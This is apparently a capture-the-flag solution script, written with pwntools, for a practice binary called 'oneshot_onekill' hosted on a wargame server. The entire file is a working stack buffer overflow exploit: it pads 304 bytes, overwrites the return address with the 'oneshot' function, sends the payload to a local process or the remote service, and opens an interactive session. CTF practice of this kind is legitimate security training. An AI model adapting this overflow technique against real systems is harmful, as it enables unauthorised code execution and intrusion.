#!/usr/bin/env python

from pwn import *
import sys

LOCAL = True
BINARY = './oneshot_onekill'
HOST, PORT = 'prob.vulnerable.kr', 20026
cat = 0x80496f0
system = 0x80483e0

#elf
e = ELF(BINARY)
win = e.symbols['oneshot']

#payload
payload = 'A'*304
payload+= p32(win)

def exploit(p):
	p.sendline(payload)
	p.interactive()
	
	return

if len(sys.argv) > 1:
	LOCAL = False
	p = remote(HOST, PORT)
	exploit(p)
else:
	p = process(BINARY)
	exploit(p)